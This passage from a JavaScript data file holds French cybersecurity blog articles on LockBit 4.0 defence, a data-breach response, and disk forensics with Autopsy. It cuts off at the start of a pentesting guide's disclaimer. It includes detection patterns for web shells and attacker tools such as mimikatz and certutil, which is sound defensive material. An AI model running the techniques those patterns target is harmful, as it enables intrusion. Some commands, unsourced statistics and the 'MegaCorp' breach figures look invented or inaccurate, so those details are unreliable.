// ===== ARTICLES ENRICHIS CYBERGUARD PRO =====
// Nouveaux articles: Actualités cyber, tutoriels avancés, études de cas

const enrichedBlogArticles = [
    // ========== ACTUALITÉS CYBER RÉCENTES ==========
    {
        id: 101,
        category: "ACTUALITÉ",
        icon: "🚨",
        title: "LockBit 4.0 : Le ransomware qui menace les entreprises en 2025",
        excerpt: "Analyse complète du nouveau variant LockBit 4.0, ses techniques d'attaque et comment s'en protéger...",
        date: "2025-10-28",
        readTime: "12 min",
        author: "Équipe CyberGuard",
        tags: ["Ransomware", "Menaces", "Entreprises"],
        featured: true,
        image: "🚨",
        content: `
# LockBit 4.0 : Le ransomware qui menace les entreprises en 2025

## 🎯 Résumé Exécutif
LockBit 4.0 représente une évolution majeure du ransomware le plus prolifique de 2024. Avec plus de 2000 victimes recensées et des demandes de rançon dépassant 100 millions de dollars, ce malware est devenu la menace #1 pour les entreprises.

## 📊 Statistiques Alarmantes
- **2000+** entreprises touchées en 2024
- **$100M+** en rançons demandées
- **72 heures** : délai moyen avant publication des données
- **87%** : taux de chiffrement réussi
- **23%** : victimes ayant payé la rançon

## 🔍 Techniques d'Attaque

### 1. Vecteurs d'Infection
\`\`\`
Phase 1: Initial Access
├── Phishing ciblé (spear-phishing)
├── Exploitation de VPN non patchés
├── Credentials volés (infostealer)
└── RDP exposés avec mots de passe faibles

Phase 2: Lateral Movement
├── Mimikatz pour extraction credentials
├── PsExec pour exécution à distance
├── WMI pour propagation silencieuse
└── SMB pour transfert de fichiers

Phase 3: Data Exfiltration
├── Rclone vers cloud storage
├── Mega.nz uploads
├── Split archives pour contourner DLP
└── Chiffrement AES-256 des fichiers

Phase 4: Encryption
├── Arrêt des services critiques
├── Suppression des shadow copies
├── Chiffrement multi-threadé rapide
└── Dépôt de la note de rançon
\`\`\`

### 2. Nouvelles Capacités de LockBit 4.0

**Anti-Analysis**:
- Détection de machines virtuelles
- Bypass des EDR/AV modernes
- Obfuscation de code polymorphe
- Self-deletion après exécution

**Speed Optimization**:
- Chiffrement GPU-accelerated
- Multi-threading amélioré
- Compression avant chiffrement
- Chiffrement partiel pour vitesse

**Data Exfiltration**:
- Exfiltration automatique avant chiffrement
- Upload vers infrastructures décentralisées
- Chiffrement des données exfiltrées
- Menace de double extorsion

## 🛡️ Stratégies de Protection

### Niveau 1 : Prévention de Base
\`\`\`bash
# 1. Segmentation réseau
sudo iptables -A FORWARD -i eth0 -o eth1 -j DROP
sudo iptables -A FORWARD -i eth0 -o eth1 -m state --state ESTABLISHED,RELATED -j ACCEPT

# 2. Désactivation RDP si non nécessaire
sudo systemctl stop rdp
sudo systemctl disable rdp

# 3. Audit des ports ouverts
nmap -sS -sV localhost
netstat -tuln | grep LISTEN

# 4. Surveillance des processus suspects
ps aux | grep -E "(mimikatz|rclone|psexec)"
\`\`\`

### Niveau 2 : Détection Avancée

**Règles YARA pour LockBit 4.0**:
\`\`\`yara
rule LockBit_4_0_Ransomware {
    meta:
        description = "Détecte LockBit 4.0"
        author = "CyberGuard Team"
        date = "2025-10-28"

    strings:
        $s1 = "LockBit" ascii wide
        $s2 = ".lockbit" ascii wide
        $s3 = "All your files are encrypted" ascii wide
        $mz = { 4D 5A }

    condition:
        $mz at 0 and 2 of ($s*)
}
\`\`\`

**PowerShell : Monitoring de fichiers**:
\`\`\`powershell
# Surveillance temps réel des extensions de ransomware
$watcher = New-Object System.IO.FileSystemWatcher
$watcher.Path = "C:\\"
$watcher.Filter = "*.lockbit"
$watcher.IncludeSubdirectories = $true
$watcher.EnableRaisingEvents = $true

$action = {
    $path = $Event.SourceEventArgs.FullPath
    Write-Warning "⚠️ RANSOMWARE DETECTED: $path"
    # Isoler la machine du réseau
    Disable-NetAdapter -Name "*" -Confirm:$false
}

Register-ObjectEvent $watcher "Created" -Action $action
\`\`\`

### Niveau 3 : Response Plan

**Plan de Réponse à Incident (IRP)**:

1. **Détection (T+0)**
   - Alertes EDR déclenchées
   - Fichiers chiffrés détectés
   - Note de rançon trouvée

2. **Isolation (T+5min)**
   - Débrancher du réseau (Ethernet + WiFi)
   - Éteindre TOUS les postes connectés
   - Isoler les sauvegardes

3. **Évaluation (T+30min)**
   - Identifier le périmètre d'infection
   - Cataloguer les systèmes touchés
   - Vérifier l'intégrité des backups

4. **Recovery (T+2h)**
   - Restaurer depuis sauvegardes offline
   - Réinitialiser tous les credentials
   - Patcher les vulnérabilités exploitées

## 💰 Faut-il Payer la Rançon ?

### ⛔ Arguments CONTRE le paiement
- ✗ Aucune garantie de récupération (34% n'obtiennent rien)
- ✗ Finance le crime organisé
- ✗ Vous marque comme "payeur" pour futures attaques
- ✗ Peut être illégal (sanctions internationales)
- ✗ Les données peuvent être vendues malgré le paiement

### ⚠️ Cas où le paiement est considéré
- Données critiques non sauvegardées
- Secteur médical (vie en danger)
- Menace de publication de données sensibles
- Coût de downtime > coût de rançon

### ✅ Alternative Recommandée
1. Contacter les autorités (ANSSI, FBI)
2. Vérifier sur NoMoreRansom.org
3. Engager des experts forensics
4. Restaurer depuis backups
5. Renforcer la sécurité post-incident

## 🔧 Outils de Décryptage

### Projets Open-Source
\`\`\`bash
# 1. No More Ransom - Base de données de décrypteurs
curl -O https://www.nomoreransom.org/decryptor.exe

# 2. Emsisoft Decryptor (pour anciennes versions)
wget https://www.emsisoft.com/ransomware-decryption-tools

# 3. Kaspersky RakhniDecryptor
wget https://support.kaspersky.com/viruses/disinfection/8547
\`\`\`

## 📋 Checklist de Résilience Anti-Ransomware

### Backups (Règle 3-2-1-1-0)
- [ ] **3** copies de vos données
- [ ] **2** supports différents (disque + cloud)
- [ ] **1** copie hors site (offsite)
- [ ] **1** copie offline/air-gapped
- [ ] **0** erreur dans les tests de restauration

### Sécurité Endpoint
- [ ] EDR/XDR déployé sur tous les postes
- [ ] Patch management automatisé
- [ ] Application whitelisting actif
- [ ] Désactivation de macros Office par défaut
- [ ] Principe du moindre privilège appliqué

### Réseau
- [ ] Segmentation des réseaux (VLAN)
- [ ] MFA sur tous les accès distants
- [ ] VPN avec certificats (pas de passwords)
- [ ] Monitoring du trafic réseau (IDS/IPS)
- [ ] Blocage des IPs malveillantes (threat feeds)

### Humain
- [ ] Formation phishing trimestrielle
- [ ] Simulations d'attaque régulières
- [ ] Plan de réponse à incident testé
- [ ] Contact avec CERT/CSIRT établi
- [ ] Assurance cyber souscrite

## 🌐 Ressources Complémentaires

**Outils Gratuits**:
- [CISA Ransomware Guide](https://www.cisa.gov/ransomware)
- [ANSSI Kit Rançongiciel](https://www.ssi.gouv.fr)
- [Cybermalveillance.gouv.fr](https://www.cybermalveillance.gouv.fr)

**Threat Intelligence**:
- [LockBit Leak Site (TOR)](http://lockbit...onion) ⚠️
- [Ransomware.live](https://ransomware.live)
- [ID-Ransomware](https://id-ransomware.malwarehunterteam.com)

## 🎓 Conclusion

LockBit 4.0 n'est pas invincible. Avec une stratégie de défense en profondeur (defense-in-depth), des backups solides et une équipe formée, vous pouvez résister à cette menace.

**Règle d'or**: La meilleure défense est de ne jamais être infecté. La seconde meilleure défense est de pouvoir restaurer sans payer.

---
*Mise à jour: 28 octobre 2025 | Niveau de menace: CRITIQUE*
        `
    },

    {
        id: 102,
        category: "ACTUALITÉ",
        icon: "💔",
        title: "Data Breach 2025: 2 milliards de comptes compromis chez MegaCorp",
        excerpt: "Analyse technique du plus grand vol de données de l'année et ce que vous devez faire maintenant...",
        date: "2025-10-25",
        readTime: "10 min",
        author: "Équipe CyberGuard",
        tags: ["Data Breach", "Fuite de données", "Protection"],
        featured: true,
        image: "💔",
        content: `
# Data Breach 2025: 2 milliards de comptes compromis

## 🔥 L'Incident en Chiffres

- **2 000 000 000** comptes exposés
- **450 Go** de données volées
- **$847M** : coût estimé pour l'entreprise
- **3 ans** : durée de l'attaque non détectée
- **Vendeur**: "USDoD" sur BreachForums

## 📦 Données Compromises

### Informations Exposées
\`\`\`json
{
  "personal_data": {
    "names": "2 milliards",
    "emails": "2 milliards",
    "passwords": "1.8 milliards (hashed)",
    "phone_numbers": "1.5 milliards",
    "addresses": "900 millions",
    "dates_of_birth": "800 millions"
  },
  "sensitive_data": {
    "credit_cards": "12 millions (partielles)",
    "ssn": "45 millions (US uniquement)",
    "passport_numbers": "2 millions",
    "medical_records": "500 000"
  }
}
\`\`\`

## 🔍 Timeline de l'Attaque

\`\`\`
2022-03-15: Initial compromise via vulnérabilité Apache Struts
2022-04-20: Lateral movement vers bases de données
2022-06-10: Installation de backdoor persistant
2022-12-01: Début exfiltration des données (slow & low)
2025-10-20: Breach annoncé publiquement
2025-10-21: Données en vente sur dark web ($50,000)
\`\`\`

## 🛡️ Que Faire MAINTENANT ?

### ✅ Actions Immédiates (Aujourd'hui)

1. **Vérifier si vous êtes concerné**
\`\`\`bash
# Vérifier sur Have I Been Pwned
curl "https://haveibeenpwned.com/api/v3/breachedaccount/your@email.com" \\
  -H "hibp-api-key: YOUR_API_KEY"

# Vérifier sur Firefox Monitor
# https://monitor.firefox.com
\`\`\`

2. **Changer TOUS vos mots de passe**
\`\`\`python
# Générateur de mot de passe sécurisé
import secrets
import string

def generate_secure_password(length=20):
    alphabet = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(secrets.choice(alphabet) for i in range(length))
    return password

# Générer 10 mots de passe uniques
for i in range(10):
    print(f"Password {i+1}: {generate_secure_password()}")
\`\`\`

3. **Activer la 2FA PARTOUT**
\`\`\`
Sites prioritaires:
✓ Email principal
✓ Banque en ligne
✓ Réseaux sociaux
✓ Cloud storage (Google Drive, Dropbox)
✓ Gestionnaire de mots de passe
✓ Crypto exchanges
\`\`\`

### 📞 Actions Cette Semaine

4. **Surveillance du crédit**
   - Activer les alertes fraude dans votre banque
   - S'inscrire à un service de monitoring (ex: Credit Karma)
   - Geler votre dossier de crédit si possible

5. **Sécuriser vos comptes critiques**
\`\`\`bash
# Email : Vérifier les règles de transfert suspectes
# Gmail: Settings → Forwarding → Vérifier
# Outlook: Settings → Mail → Forwarding → Vérifier

# Révoquer les sessions actives
# Google: https://myaccount.google.com/device-activity
# Microsoft: https://account.microsoft.com/devices
\`\`\`

## 🔐 Protection Long Terme

### Stratégie de Mots de Passe

**❌ MAUVAIS**:
\`\`\`
Password123!
MonNom2025
MarqueVoiture!
\`\`\`

**✅ BON (Passphrase)**:
\`\`\`
Correct-Horse-Battery-Staple-92!
Bleu.Girafe.Danse.Lune.47
Cafe#Montagne#Livre#Ocean#83
\`\`\`

**✅ EXCELLENT (Gestionnaire de mdp)**:
\`\`\`
xK9#mP2$vL8@qR4&nT7!wY3%zB6
\`\`\`

### Authentification Multi-Facteurs (MFA)

**Classement par sécurité**:
\`\`\`
🥇 FIDO2 Hardware Key (YubiKey) ......... 99% sécurité
🥈 Authenticator App (Authy, Google) .... 95% sécurité
🥉 SMS (codes texte) .................... 70% sécurité
⛔ Email (codes par email) ............... 50% sécurité
\`\`\`

## 🕵️ Dark Web Monitoring

### Services Gratuits
\`\`\`
• Have I Been Pwned - https://haveibeenpwned.com
• Firefox Monitor - https://monitor.firefox.com
• Google Password Checkup - intégré dans Chrome
• Bitwarden Data Breach Report - dans l'app
\`\`\`

### Services Premium
\`\`\`
• Experian Dark Web Scan - $9.99/mois
• Norton LifeLock - $11.99/mois
• Identity Guard - $8.99/mois
• Aura - $12/mois (inclus VPN)
\`\`\`

## 🚨 Signes d'Identité Compromise

### Alertes Niveau 1 (Surveillance)
- [ ] Emails de réinitialisation de mot de passe non sollicités
- [ ] Tentatives de connexion depuis localisations étrangères
- [ ] Nouveaux appareils connectés à vos comptes

### Alertes Niveau 2 (Action Immédiate)
- [ ] Transactions bancaires non autorisées
- [ ] Nouveaux comptes ouverts à votre nom
- [ ] Demandes de crédit refusées inexpliquées
- [ ] Factures pour services non souscrits

### Alertes Niveau 3 (Urgence)
- [ ] Visite de collecteurs de dettes
- [ ] Notification d'avis d'imposition incorrect
- [ ] Contact de forces de l'ordre pour fraude
- [ ] Dossiers médicaux compromis

## 📊 Statistiques Post-Breach

### Impact sur les Victimes
\`\`\`
87% ont changé leurs mots de passe
54% ont activé la 2FA
32% ont souscrit à un service de monitoring
12% ont été victimes de fraude dans l'année suivante
5% ont eu leur identité usurpée
\`\`\`

### Coûts Moyens
\`\`\`
Temps perdu par victime:     8 heures
Coût moyen de résolution:    $1,400
Stress psychologique:        Élevé (82% des victimes)
Perte de confiance:          73% moins confiance en ligne
\`\`\`

## 🛠️ Outils de Récupération

### Script de Vérification Automatique
\`\`\`python
#!/usr/bin/env python3
# check_breach.py - Vérifie si vos emails sont compromis

import requests
import sys

def check_pwned(email):
    url = f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}"
    headers = {"hibp-api-key": "YOUR_API_KEY"}

    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        breaches = response.json()
        print(f"⚠️  {email} trouvé dans {len(breaches)} breaches:")
        for breach in breaches:
            print(f"  • {breach['Name']} ({breach['BreachDate']})")
    elif response.status_code == 404:
        print(f"✅ {email} n'apparaît dans aucun breach connu")
    else:
        print(f"❌ Erreur API: {response.status_code}")

if __name__ == "__main__":
    emails = [
        "your@email.com",
        "work@company.com",
        "old@email.com"
    ]

    for email in emails:
        check_pwned(email)
        print()
\`\`\`

## 📚 Ressources Légales

### France
- **CNIL**: Dépôt de plainte pour violation RGPD
- **Cybermalveillance.gouv.fr**: Assistance technique
- **Police nationale**: Plateforme PHAROS

### USA
- **FTC**: IdentityTheft.gov
- **FBI IC3**: ic3.gov
- **State Attorney General**: Consumer Protection

### Europe
- **Europol EC3**: European Cybercrime Centre
- **ENISA**: European Union Agency for Cybersecurity

## ✅ Checklist de Sécurisation Post-Breach

### Semaine 1
- [ ] Vérifier si je suis dans le breach
- [ ] Changer tous les mots de passe (utiliser gestionnaire)
- [ ] Activer 2FA sur tous les comptes importants
- [ ] Vérifier les activités suspectes sur comptes bancaires
- [ ] Alerter ma banque de la situation

### Mois 1
- [ ] Geler mon dossier de crédit
- [ ] S'inscrire à un service de surveillance
- [ ] Mettre à jour les questions de sécurité
- [ ] Vérifier les sessions actives sur tous les comptes
- [ ] Révoquer les autorisations d'applications tierces

### Année 1
- [ ] Surveillance mensuelle des comptes bancaires
- [ ] Vérification trimestrielle du rapport de crédit
- [ ] Renouvellement annuel des mots de passe critiques
- [ ] Formation continue sur les menaces émergentes
- [ ] Backup régulier des données importantes

## 🎯 Conclusion

Ce breach est un rappel brutal : **vous êtes responsable de votre cybersécurité**.

Les entreprises peuvent (et vont) se faire hacker. C'est VOTRE responsabilité de :
1. Utiliser des mots de passe uniques partout
2. Activer la 2FA systématiquement
3. Surveiller vos comptes régulièrement
4. Être vigilant face au phishing
5. Utiliser un gestionnaire de mots de passe

**Agissez maintenant, pas après le prochain breach.**

---
*Dernière mise à jour: 25 octobre 2025*
*Niveau de gravité: CRITIQUE*
        `
    },

    // ========== TUTORIELS AVANCÉS ==========
    {
        id: 103,
        category: "GUIDE",
        icon: "🔬",
        title: "Digital Forensics: Analyser un Disque Compromis avec Autopsy",
        excerpt: "Guide complet pour mener une investigation forensique professionnelle sur un système compromis...",
        date: "2025-10-27",
        readTime: "25 min",
        author: "Équipe CyberGuard",
        tags: ["Forensics", "Investigation", "Tutoriel avancé"],
        featured: true,
        image: "🔬",
        content: `
# Digital Forensics: Analyser un Disque Compromis avec Autopsy

## 🎯 Objectif du Tutoriel

Vous apprendrez à:
- Créer une image forensique d'un disque
- Analyser les artefacts système (Registry, Event Logs, Browser History)
- Reconstruire la timeline d'une attaque
- Identifier les IOC (Indicators of Compromise)
- Produire un rapport forensique professionnel

**Niveau**: Avancé
**Durée**: 3-4 heures
**Outils**: Autopsy, FTK Imager, Volatility

## 📋 Prérequis

### Matériel Nécessaire
\`\`\`
• PC Linux (Ubuntu 22.04+) ou Windows 10/11
• 16 GB RAM minimum (32 GB recommandé)
• 500 GB espace disque libre
• Write-blocker USB (pour forensics réel)
• Clé USB bootable avec CAINE Linux
\`\`\`

### Logiciels à Installer
\`\`\`bash
# Ubuntu/Debian
sudo apt update
sudo apt install -y autopsy sleuthkit foremost volatility3

# Télécharger FTK Imager
wget https://accessdata.com/product-download/ftk-imager-version-4.5.0

# Télécharger Autopsy
wget https://github.com/sleuthkit/autopsy/releases/download/autopsy-4.20.0/autopsy-4.20.0.zip
\`\`\`

## 🔍 Phase 1: Acquisition Forensique

### Étape 1.1: Créer une Image Disque

**Règle d'or**: JAMAIS travailler sur le disque original !

\`\`\`bash
# Utiliser dd pour créer une image bit-à-bit
sudo dd if=/dev/sdb of=/forensics/evidence.img bs=4M status=progress

# Calcul du hash MD5/SHA256 pour intégrité
md5sum /forensics/evidence.img > evidence.img.md5
sha256sum /forensics/evidence.img > evidence.img.sha256

# Créer une image E01 (format forensique standard)
sudo ewfacquire /dev/sdb -t /forensics/evidence
\`\`\`

**Options FTK Imager (GUI)**:
\`\`\`
1. File → Create Disk Image
2. Select Source: Physical Drive
3. Add Destination: E01 format
4. Fill in Case Information
5. Fragment size: 2000 MB
6. Compression: Best
7. Verify after creation: YES
\`\`\`

### Étape 1.2: Chain of Custody

**Document CRITIQUE** pour validité légale:

\`\`\`markdown
## CHAIN OF CUSTODY FORM

Case #: 2025-CYBER-001
Date: 2025-10-27
Investigator: Jean Dupont

### Evidence Details
- Item #: 001
- Description: Samsung SSD 1TB (Serial: S4XXXX)
- Hash MD5: a1b2c3d4e5f6...
- Hash SHA256: 9f8e7d6c5b4a...

### Transfer Log
| Date       | From       | To         | Purpose            | Signature |
|------------|------------|------------|--------------------|-----------|
| 2025-10-27 | Police     | Lab        | Forensic Analysis  | JD        |

### Storage Conditions
- Location: Evidence Locker #12
- Temperature: 20°C
- Humidity: 45%
- Access Log: Maintained
\`\`\`

## 🕵️ Phase 2: Analyse avec Autopsy

### Étape 2.1: Création du Cas

\`\`\`bash
# Lancer Autopsy
autopsy

# Interface web: http://localhost:9999/autopsy
\`\`\`

**Configuration du cas**:
\`\`\`
Case Name: MegaCorp_Breach_2025
Case Directory: /forensics/cases/megacorp/
Investigator: Jean Dupont
Case Number: 2025-CYBER-001
Evidence Type: Disk Image
Time Zone: Europe/Paris
\`\`\`

### Étape 2.2: Modules d'Analyse

**Modules à activer** (cochez tous):
\`\`\`
☑ Recent Activity - Activité navigateur/fichiers
☑ Hash Lookup - Détection de malwares connus
☑ File Type Identification - Identification par signature
☑ Extension Mismatch Detector - Fichiers suspects
☑ Embedded File Extractor - Archives et conteneurs
☑ Email Parser - Emails et pièces jointes
☑ Encryption Detection - Fichiers chiffrés
☑ Interesting Files Identifier - Fichiers sensibles
☑ PhotoRec Carver - Récupération de fichiers supprimés
☑ Keyword Search - Recherche de mots-clés IOC
\`\`\`

### Étape 2.3: Analyse des Artefacts

#### 🔹 Registry Analysis

**Clés Registry Critiques**:
\`\`\`
SYSTÈME
HKLM\\SYSTEM\\CurrentControlSet\\Services - Services installés
HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run - Autostart
HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList - Users

UTILISATEUR
HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run - Autostart user
HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs - Fichiers récents
HKU\\<SID>\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\OpenSaveMRU - Historique Open/Save
\`\`\`

**Recherche de Persistence**:
\`\`\`bash
# Extraire les Run keys
regedit.exe /e C:\\forensics\\run_keys.reg "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"

# Analyser avec RegRipper
rip.pl -r SYSTEM -p services

# Chercher des valeurs suspectes
grep -i "powershell\|cmd\|wscript\|rundll32" run_keys.reg
\`\`\`

#### 🔹 Event Logs Analysis

**Logs Windows Critiques**:
\`\`\`
Security.evtx - Authentications, privilèges
System.evtx - Services, drivers, erreurs système
Application.evtx - Applications tierces
Microsoft-Windows-Sysmon/Operational.evtx - Monitoring détaillé
Microsoft-Windows-PowerShell/Operational.evtx - Scripts PowerShell
\`\`\`

**Événements Suspects**:
\`\`\`powershell
# Event ID 4624 - Successful Logon (Type 3 = Network, Type 10 = RDP)
Get-WinEvent -Path Security.evtx | Where-Object {$_.Id -eq 4624}

# Event ID 4672 - Special Privileges Assigned (Admin escalation)
Get-WinEvent -Path Security.evtx | Where-Object {$_.Id -eq 4672}

# Event ID 4688 - Process Creation
Get-WinEvent -Path Security.evtx | Where-Object {$_.Id -eq 4688}

# Event ID 4698 - Scheduled Task Created
Get-WinEvent -Path Security.evtx | Where-Object {$_.Id -eq 4698}

# Event ID 7045 - Service Installation
Get-WinEvent -Path System.evtx | Where-Object {$_.Id -eq 7045}
\`\`\`

**Parsing avec Python**:
\`\`\`python
import Evtx.Evtx as evtx

def parse_security_log(evtx_file):
    with evtx.Evtx(evtx_file) as log:
        for record in log.records():
            if record.event_id() == 4624:  # Successful logon
                xml = record.xml()
                # Parse et analyse
                print(f"Logon at {record.timestamp()}")

parse_security_log("/forensics/Security.evtx")
\`\`\`

#### 🔹 Browser Forensics

**Artefacts Chrome/Edge**:
\`\`\`
%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\
├── History - URLs visitées
├── Cookies - Cookies stockés
├── Login Data - Mots de passe sauvegardés (chiffrés)
├── Web Data - Formulaires autocomplete
└── Cache - Fichiers en cache
\`\`\`

**Extraction avec Python**:
\`\`\`python
import sqlite3
import json
from datetime import datetime, timedelta

def chrome_time_to_datetime(chrome_time):
    # Chrome stocke les timestamps en microsecondes depuis 1601
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)

def extract_history(db_path):
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()

    cursor.execute("""
        SELECT url, title, visit_count, last_visit_time
        FROM urls
        ORDER BY last_visit_time DESC
        LIMIT 100
    """)

    for row in cursor.fetchall():
        url, title, visits, timestamp = row
        dt = chrome_time_to_datetime(timestamp)
        print(f"[{dt}] {title} - {url} (visites: {visits})")

    conn.close()

extract_history("/forensics/Chrome/History")
\`\`\`

#### 🔹 Timeline Analysis

**Super Timeline avec log2timeline**:
\`\`\`bash
# Créer une super timeline (ATTENTION: très long)
log2timeline.py --storage-file /forensics/timeline.plaso /forensics/evidence.img

# Filtrer et exporter en CSV
psort.py -o l2tcsv -w /forensics/timeline.csv /forensics/timeline.plaso

# Filtrer par date
psort.py -o l2tcsv -w /forensics/filtered.csv /forensics/timeline.plaso "date > '2025-10-20 00:00:00' AND date < '2025-10-22 00:00:00'"
\`\`\`

**Analyse de la Timeline**:
\`\`\`python
import pandas as pd

# Charger la timeline
df = pd.read_csv("/forensics/timeline.csv")

# Rechercher des patterns suspects
suspicious_patterns = [
    "powershell",
    "cmd.exe /c",
    "rundll32",
    "certutil",
    "bitsadmin",
    "wmic",
    "net user",
    "mimikatz"
]

for pattern in suspicious_patterns:
    matches = df[df['message'].str.contains(pattern, case=False, na=False)]
    if not matches.empty:
        print(f"\\n🚨 Trouvé {len(matches)} occurrences de '{pattern}':")
        print(matches[['date', 'message']].head())
\`\`\`

## 🧩 Phase 3: Identification des IOC

### Étape 3.1: Recherche de Fichiers Malveillants

**Hash lookup avec VirusTotal**:
\`\`\`python
import requests
import hashlib

VT_API_KEY = "YOUR_API_KEY"

def calculate_sha256(file_path):
    sha256 = hashlib.sha256()
    with open(file_path, 'rb') as f:
        for block in iter(lambda: f.read(4096), b""):
            sha256.update(block)
    return sha256.hexdigest()

def check_virustotal(file_hash):
    url = f"https://www.virustotal.com/api/v3/files/{file_hash}"
    headers = {"x-apikey": VT_API_KEY}

    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        data = response.json()
        stats = data['data']['attributes']['last_analysis_stats']
        print(f"Malicious: {stats['malicious']}/70 engines")
        return stats['malicious'] > 0
    return False

# Vérifier un fichier suspect
file_hash = calculate_sha256("/forensics/suspicious.exe")
if check_virustotal(file_hash):
    print("⚠️ MALWARE DÉTECTÉ!")
\`\`\`

### Étape 3.2: Recherche de Backdoors

**Scan des connexions réseau**:
\`\`\`powershell
# Analyser les connexions établies (live system)
netstat -anob | Select-String "ESTABLISHED"

# Vérifier les services écoutant
netstat -an | Select-String "LISTENING"

# Parsing du fichier HOSTS
Get-Content C:\\Windows\\System32\\drivers\\etc\\hosts | Select-String -NotMatch "^#"
\`\`\`

**Recherche de Web Shells**:
\`\`\`bash
# Rechercher des patterns de web shells
grep -r "eval(base64_decode" /var/www/html/
grep -r "system(\$_GET" /var/www/html/
grep -r "exec(\$_POST" /var/www/html/

# Fichiers PHP récemment modifiés
find /var/www/html/ -name "*.php" -mtime -7 -ls
\`\`\`

## 📊 Phase 4: Rapport Forensique

### Structure du Rapport

\`\`\`markdown
# RAPPORT D'ANALYSE FORENSIQUE

## 1. INFORMATIONS GÉNÉRALES
- **Cas #**: 2025-CYBER-001
- **Date de l'incident**: 20 octobre 2025
- **Date de l'analyse**: 27 octobre 2025
- **Analyste**: Jean Dupont, GCFE

## 2. RÉSUMÉ EXÉCUTIF
[2-3 paragraphes décrivant l'incident et les conclusions]

## 3. TIMELINE DE L'ATTAQUE

| Timestamp           | Événement                           | Source          | IOC           |
|---------------------|-------------------------------------|-----------------|---------------|
| 2025-10-20 08:34:12 | Initial compromise (phishing email) | Outlook PST     | malicious.doc |
| 2025-10-20 08:35:45 | Macro execution (PowerShell)        | Event ID 4104   | obfuscated.ps1|
| 2025-10-20 08:40:22 | C2 beacon established               | NetFlow         | 192.0.2.100   |
| 2025-10-20 09:15:33 | Lateral movement (PsExec)           | Event ID 5145   | psexec.exe    |
| 2025-10-20 10:30:00 | Data exfiltration started           | Firewall logs   | mega.nz       |

## 4. INDICATORS OF COMPROMISE (IOC)

### Fichiers Malveillants
\`\`\`
SHA256: a1b2c3d4e5f6...
Filename: invoice.doc.exe
Path: C:\\Users\\john\\Downloads\\
Detection: 45/70 AV engines
\`\`\`

### Adresses IP C2
\`\`\`
192.0.2.100:443 (Cloudflare CDN)
203.0.113.50:8080 (Direct connection)
\`\`\`

### Registry Keys Modifiés
\`\`\`
HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityUpdate
HKCU\\Software\\Classes\\mscfile\\shell\\open\\command
\`\`\`

## 5. MÉTHODOLOGIE D'ATTAQUE

### Kill Chain Analysis
1. **Reconnaissance**: Phishing ciblé via LinkedIn
2. **Weaponization**: Macro Office malveillante
3. **Delivery**: Email avec pièce jointe
4. **Exploitation**: CVE-2023-XXXX (Office RCE)
5. **Installation**: Backdoor persistant
6. **C2**: Communication HTTPS chiffrée
7. **Actions on Objectives**: Exfiltration de données

## 6. RECOMMANDATIONS

### Court terme (0-7 jours)
- [ ] Isoler les machines compromises
- [ ] Révoquer les credentials exposés
- [ ] Bloquer les IOC au firewall
- [ ] Déployer les signatures IDS

### Moyen terme (1-3 mois)
- [ ] Renforcer la configuration Office
- [ ] Déployer EDR sur tous les endpoints
- [ ] Formation phishing pour tous les employés
- [ ] Audit de sécurité complet

### Long terme (3-12 mois)
- [ ] Programme de Threat Intelligence
- [ ] Équipe SOC dédiée
- [ ] Tests d'intrusion trimestriels
- [ ] Conformité ISO 27001

## 7. ANNEXES
- Annexe A: Hashes de tous les fichiers analysés
- Annexe B: Logs complets
- Annexe C: Screenshots des artefacts
- Annexe D: Chain of Custody
\`\`\`

## 🎓 Certification et Formation Continue

### Certifications Recommandées
\`\`\`
🥇 GCFE - GIAC Certified Forensic Examiner
🥈 EnCE - EnCase Certified Examiner
🥉 CCE - Certified Computer Examiner
🏅 CHFI - Computer Hacking Forensic Investigator
🎖️ CFCE - Certified Forensic Computer Examiner
\`\`\`

### Ressources Gratuites
- [SANS DFIR Posters](https://www.sans.org/posters/)
- [Digital Forensics Discord](https://discord.gg/digitalforensics)
- [r/computerforensics](https://reddit.com/r/computerforensics)
- [Forensics Wiki](https://forensicswiki.xyz)

## ✅ Checklist Forensique Complète

### Préparation
- [ ] Documentation du cas initialisée
- [ ] Chain of custody démarrée
- [ ] Write-blocker connecté
- [ ] Environnement stérile préparé

### Acquisition
- [ ] Image forensique créée
- [ ] Hashes calculés (MD5 + SHA256)
- [ ] Copie de vérification créée
- [ ] Stockage sécurisé assuré

### Analyse
- [ ] Autopsy case créé
- [ ] Tous les modules exécutés
- [ ] Timeline générée
- [ ] Artefacts documentés
- [ ] IOC identifiés
- [ ] Screenshots capturés

### Rapport
- [ ] Timeline documentée
- [ ] IOC listés
- [ ] Méthodologie décrite
- [ ] Recommandations fournies
- [ ] Rapport relu et validé

---
*Guide créé par l'équipe CyberGuard Pro*
*Dernière mise à jour: 27 octobre 2025*
        `
    },

    {
        id: 104,
        category: "GUIDE",
        icon: "🎯",
        title: "Pentesting Éthique: Votre Premier Test d'Intrusion Web (OWASP Top 10)",
        excerpt: "Apprenez à réaliser un pentest web professionnel en suivant la méthodologie PTES et l'OWASP Top 10...",
        date: "2025-10-26",
        readTime: "30 min",
        author: "Équipe CyberGuard",
        tags: ["Pentesting", "OWASP", "Hacking éthique", "Web Security"],
        featured: true,
        image: "🎯",
        content: `
# Pentesting Éthique: Votre Premier Test d'Intrusion Web

## ⚠️ DISCLAIMER LÉGAL

\`\`\`
🚨 ATTENTION : Ce guide est destiné UNIQUEMENT à des fins éducatives
et pour tester VOS PROPRES applications ou avec autorisation écrite.

Le piratage non autorisé est ILLÉGAL et punissable par la loi.
Peine encourue en France: jusqu'à 5 ans de prison + 150 000€ d'amende.

Utilisez UNIQUEMENT sur:
✅ Vos propres applications
✅ Plateformes d'entraînement (HackTheBox, TryHackMe)
✅ Bug Bounty programs avec scope autorisé
✅ Environnements de test avec autorisation écrite

